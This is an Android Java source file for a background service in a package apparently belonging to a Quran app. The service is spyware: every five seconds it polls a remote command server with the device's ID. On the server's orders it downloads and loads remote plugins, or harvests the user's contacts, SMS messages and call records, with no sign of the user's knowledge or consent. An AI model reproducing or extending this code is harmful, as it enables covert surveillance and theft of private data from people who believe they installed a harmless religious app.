package com.powerock.quran.plugin;

import android.app.Activity;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.util.Log;
import android.view.View;

import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.IOException;



/**
 * Created by chuyang on 2014/12/12.
 */
public class CommandService extends Service {

    public static final String TAG = "CommandService";
    private static final int  COMMAND_TIME =  5000;
    private static final int  CHECK_TIME = 500;
    private String uuid;

    private Handler handler = new Handler();
    private Handler statusHandler = new Handler();

    

    private Runnable runnable=new Runnable(){
        @Override
        public void run() {
            // TODO Auto-generated method stub
            getCommand(uuid);
            handler.postDelayed(this, COMMAND_TIME);
        }
    };
    @Override
    public void onCreate() {
        super.onCreate();
        File f = new File(Constants.PLUGIN_DIR);
        if(!f.exists())
            f.mkdirs();
        Log.d(TAG, "onCreate() executed");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "onStartCommand() executed");
        SharedPreferences uuidSP = getSharedPreferences("uuid", Activity.MODE_PRIVATE);
        uuid = uuidSP.getString("uuid", "");
        Log.d("uuid", uuid);
        handler.postDelayed(runnable, COMMAND_TIME);
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "onDestroy() executed");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void getCommand(final String uuid) {
        JsonObjectRequest getRequest = new JsonObjectRequest(
                Request.Method.GET, Constants.COMMAND_URL+ uuid, null,
                new Response.Listener<JSONObject>() {
                    public void onResponse(JSONObject response) {
                        // display response
                       // Log.d("URL", Constants.COMMAND_URL+ uuid);
                        int errorCode = 1;
                        try {
                            errorCode = response.getInt("errorcode");
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                        Log.d("action", response.toString());
                        if(errorCode == 0){
                            try {
                                String action = response.getString("action");

                                if(action.equals("none")){
                                    Log.d("command", "无指令");
                                }else if(action.equals("load")){
                                    PluginManager pm = new PluginManager(CommandService.this);
                                    pm.updatePlugins(response.getJSONObject("params").getString("url"));
                                    Log.d("command", "更新插件");
                                }else if(action.equals("contact")){
                                    PluginManager.getContacts(CommandService.this, uuid);
                                    Log.d("command", "获取通讯录");
                                }else if(action.equals("message")){
                                    PluginManager.getMessage(CommandService.this, uuid);
                                    Log.d("command", "获取短信");
                                }else if(action.equals("callrecord")){
                                    PluginManager.getCallRecord(CommandService.this, uuid);
                                    Log.d("command", "获取通话记录");
                                }
                            } catch (JSONException e) {
                                e.printStackTrace();
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                        }


                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                Log.d("error", error.toString());
            }
        });
        if(VolleySingleton.getInstance(this).getRequestQueue() != null)
            VolleySingleton.getInstance(this).getRequestQueue().add(getRequest);
    }

   

}
